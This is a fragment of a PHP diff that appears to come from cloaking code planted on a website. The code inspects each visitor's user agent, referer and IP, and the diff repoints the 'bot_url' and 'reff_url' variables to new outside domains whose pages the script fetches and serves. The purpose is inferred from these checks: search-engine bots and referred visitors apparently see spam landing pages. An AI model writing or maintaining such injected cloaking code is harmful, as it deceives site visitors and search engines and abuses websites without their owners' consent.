@@ -25,8 +25,8 @@ $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 $ip = get_client_ip();
 
-$bot_url = "https://faktawanita.com/dexnova/licinsopisma.html";
-$reff_url = "https://licinpunya.sgp1.digitaloceanspaces.com/sopisma.html";
+$bot_url = "https://plerkejepit.cc/lp/jubaedah.html";
+$reff_url = "https://aptspace.sgp1.cdn.digitaloceanspaces.com/jubaedah.html";
 
 $file = lph($bot_url);
 
